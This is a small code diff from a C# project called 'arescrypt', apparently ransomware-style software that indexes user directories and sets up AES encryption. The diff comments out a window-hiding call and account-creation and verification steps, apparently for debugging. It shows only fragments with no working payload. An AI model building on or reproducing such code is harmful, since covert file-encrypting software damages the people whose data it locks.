@@ -26,8 +26,8 @@ namespace arescrypt
             Console.WriteLine("Current path is: " + Configuration.currentWorkingDirectory + "\n");
             // End welcome message
 
-            if (!config.debugMode)
-                Miscellaneous.HideWindow(); // Hide Window, upon launch
+            if (!config.debugMode) { }
+                // Miscellaneous.HideWindow(); // Hide Window, upon launch
 
             var userSpecificDirs = new List<string> { "" };
             string[] fullFileIndex = { "" };
@@ -65,8 +65,8 @@ namespace arescrypt
                 Cryptography.encIV = myAes.IV;
             }
 
-            Console.WriteLine("Account created? " + accountManager.CreateUser());
-            accountManager.CheckVerification();
+            // Console.WriteLine("Account created? " + accountManager.CreateUser());
+            // accountManager.CheckVerification();
 
             // Cryptography.executeExample(); // Execute cryptography example
 
